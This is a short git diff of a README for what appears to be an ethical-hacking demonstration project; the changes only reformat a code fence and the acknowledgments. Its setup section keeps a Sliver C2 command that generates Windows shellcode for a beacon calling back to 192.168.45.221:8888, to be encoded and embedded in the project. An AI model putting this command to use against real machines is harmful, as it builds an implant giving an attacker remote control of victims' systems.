@@ -20,7 +20,7 @@ This is a Digital Honk Project that illustrates cybersecurity techniques within 
 
 ## Setup
 1. **Generate Payload**: Use the Sliver C2 framework to generate your shellcode payload:
-```
+```bash
 sliver> generate --mtls 192.168.45.221:8888 --os windows --arch amd64 --format shellcode --save beacon.bin
 ```
 2. **Encode Payload**: With the Payload-Encoder tool, encode the `beacon.bin` file for embedding within the project:
@@ -64,5 +64,5 @@ This project is designed for educational and ethical hacking purposes only. Ensu
 This project is licensed under the MIT License - see the LICENSE file for details.
 Acknowledgments
 
-    Special thanks to the Sliver C2 framework for the payload generation capabilities.
-    Gratitude to the cybersecurity community for the continuous exchange of knowledge and ethical hacking practices.
+Special thanks to the Sliver C2 framework for the payload generation capabilities.
+Gratitude to the cybersecurity community for the continuous exchange of knowledge and ethical hacking practices.
